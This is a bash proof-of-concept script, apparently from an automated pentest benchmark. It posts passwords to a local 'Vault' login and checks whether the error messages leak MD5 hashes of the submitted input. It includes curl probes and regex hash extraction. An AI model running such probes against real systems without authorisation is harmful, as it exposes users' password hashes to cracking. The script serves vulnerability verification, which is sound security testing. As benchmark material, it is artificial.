#!/bin/bash
# POC: Demonstrates MD5 hash leakage in authentication error responses. Shows that the application returns MD5 hashes of submitted passwords in error messages, allowing attackers to extract and crack hashes.
# Target: ./repo
# Created: 2025-11-07T16:44:42.506Z
# Session: benchmark-XBEN-060-24-mhp2yh9y

# MD5 Hash Leakage in Authentication Response - POC
# This script demonstrates the vulnerability where the application
# leaks MD5 hashes of user passwords in error messages

TARGET="${1:-http://localhost:80}"
TEST_PASSWORD="password"

echo "[*] MD5 Hash Leakage Authentication Vulnerability POC"
echo "[*] Target: $TARGET"
echo ""

# Calculate expected MD5 hash for comparison
EXPECTED_MD5="5f4dcc3b5aa765d61d8327deb882cf99"

echo "[*] Test 1: Submitting known password '${TEST_PASSWORD}'"
echo "[*] Expected MD5: ${EXPECTED_MD5}"
echo ""

# Send request with test password
RESPONSE=$(curl -s -X POST "$TARGET" -d "password=${TEST_PASSWORD}")

echo "[*] Server Response:"
echo "$RESPONSE"
echo ""

# Check if the response contains the MD5 hash
if echo "$RESPONSE" | grep -q "$EXPECTED_MD5"; then
    echo "[+] VULNERABILITY CONFIRMED: MD5 hash found in response!"
    echo "[+] The application is leaking MD5 hashes of submitted passwords"
    echo ""
    
    # Extract the hash from response for demonstration
    LEAKED_HASH=$(echo "$RESPONSE" | grep -oP 'Incorrect Vault Password: \K[a-f0-9]{32}' | head -1)
    if [ ! -z "$LEAKED_HASH" ]; then
        echo "[+] Extracted MD5 hash: $LEAKED_HASH"
        echo "[+] Verification: This hash matches MD5('$TEST_PASSWORD')"
    fi
else
    echo "[-] Hash not found in expected format, checking response structure..."
    if echo "$RESPONSE" | grep -q "Incorrect Vault Password"; then
        echo "[!] Response contains 'Incorrect Vault Password' but hash format differs"
        LEAKED_HASH=$(echo "$RESPONSE" | grep -oP 'Incorrect Vault Password: \K[a-f0-9]{32}' | head -1)
        if [ ! -z "$LEAKED_HASH" ]; then
            echo "[+] Found hash in response: $LEAKED_HASH"
            echo "[+] VULNERABILITY CONFIRMED"
        fi
    else
        echo "[-] Unexpected response format"
        exit 1
    fi
fi

echo ""
echo "[*] Test 2: Double-hashing test (submitting the hash as password)"
echo "[*] Submitting: ${EXPECTED_MD5}"
echo ""

# Send request with MD5 hash as password to show double-hashing
RESPONSE2=$(curl -s -X POST "$TARGET" -d "password=${EXPECTED_MD5}")

echo "[*] Server Response:"
echo "$RESPONSE2"
echo ""

# Expected double MD5 hash
EXPECTED_DOUBLE_MD5="696d29e0940a4957748fe3fc9efd22a3"

if echo "$RESPONSE2" | grep -q "$EXPECTED_DOUBLE_MD5"; then
    echo "[+] VULNERABILITY CONFIRMED: Double MD5 hashing detected!"
    echo "[+] Application is performing: hash(user_input) = MD5(user_input)"
    echo "[+] When hash is submitted: MD5('${EXPECTED_MD5}') = ${EXPECTED_DOUBLE_MD5}"
    echo "[+] This confirms weak hashing mechanism"
    exit 0
else
    echo "[!] Response received but double-hash format differs"
    DOUBLE_HASH=$(echo "$RESPONSE2" | grep -oP 'Incorrect Vault Password: \K[a-f0-9]{32}' | head -1)
    if [ ! -z "$DOUBLE_HASH" ]; then
        echo "[+] Found hash in response: $DOUBLE_HASH"
        exit 0
    fi
fi

exit 0